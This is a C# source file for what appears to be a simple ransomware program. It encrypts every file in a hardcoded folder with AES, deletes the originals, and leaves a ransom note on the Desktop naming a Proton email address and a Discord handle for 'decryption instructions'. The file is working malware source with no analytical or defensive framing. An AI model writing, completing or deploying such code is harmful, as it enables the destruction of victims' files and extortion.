using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

class Encryptor
{
    private byte[] aesKey;

    public Encryptor(string keyFilePath)
    {
        // Load AES key from the PEM file
        aesKey = LoadKeyFromPemFile(keyFilePath);
    }

    public byte[] EncryptData(byte[] data)
    {
        using (Aes aes = Aes.Create())
        {
            aes.Key = aesKey;

            // Use a random IV (Initialization Vector) for each encryption
            aes.GenerateIV();

            // Encrypt the data
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cryptoStream.Write(data, 0, data.Length);
                    cryptoStream.FlushFinalBlock();
                }

                // Combine IV and encrypted data
                byte[] ivAndEncryptedData = new byte[aes.IV.Length + memoryStream.ToArray().Length];
                Array.Copy(aes.IV, ivAndEncryptedData, aes.IV.Length);
                Array.Copy(memoryStream.ToArray(), 0, ivAndEncryptedData, aes.IV.Length, memoryStream.ToArray().Length);

                return ivAndEncryptedData;
            }
        }
    }

    private byte[] LoadKeyFromPemFile(string filePath)
    {
        // Read the content of the PEM file
        string pemContent = File.ReadAllText(filePath);

        // Extract the Base64-encoded key
        string base64Key = pemContent
            .Replace("-----BEGIN AES KEY-----", "")
            .Replace("-----END AES KEY-----", "")
            .Replace("\n", "");

        // Convert Base64 to byte array
        return Convert.FromBase64String(base64Key);
    }
}

class Program
{
    static void Main()
    {
        string errorLogFilePath = "error_log.txt";

        // Redirect the standard error stream to the error log file
        using (StreamWriter errorStreamWriter = new StreamWriter(errorLogFilePath, append: true))
        {
            Console.SetError(errorStreamWriter);

            // Hardcoded directory path
            string directoryPath = "D:\\Test";

            // File paths
            string keyFilePath = "key.pem";

            // Load the AES key from the PEM file for encryption
            Encryptor encryptor = new Encryptor(keyFilePath);

            // Get the Desktop path
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            // Check if desktopPath is null before using it
            if (desktopPath != null)
            {
                // Combine the paths using Path.Combine
                string messageFilePath = Path.Combine(desktopPath, "readme_.txt");
                File.WriteAllText(messageFilePath, "Your files have been encrypted. By Anonymous you can contact us for the Decryption Instructions Cyberhate@proton.me, or Cryogenproxy on discord");
                Console.WriteLine($"Readme file created on the Desktop at {messageFilePath}");

                // Scan the directory for files
                string[] files = Directory.GetFiles(directoryPath);

                foreach (string filePath in files)
                {
                    // Skip the key file itself
                    if (filePath.ToLower() == keyFilePath.ToLower())
                        continue;

                    // Read the data from the input file
                    byte[] inputData = File.ReadAllBytes(filePath);

                    // Encrypt the data
                    byte[] encryptedData = encryptor.EncryptData(inputData);

                    // Save the encrypted data to a new file with the same name and "_encrypted" suffix
                    string encryptedFilePath = Path.Combine(Path.GetDirectoryName(filePath), Path.GetFileNameWithoutExtension(filePath) + "_encrypted" + Path.GetExtension(filePath));
                    File.WriteAllBytes(encryptedFilePath, encryptedData);

                    // Delete the original file
                    File.Delete(filePath);

                    Console.WriteLine($"Encryption completed. Original file deleted. Encrypted data saved to {encryptedFilePath}");
                }
            }
            else
            {
                // Handle the case where desktopPath is null (optional)
                Console.WriteLine("Failed to get Desktop path. Readme file not created.");
            }
        }
    }
}
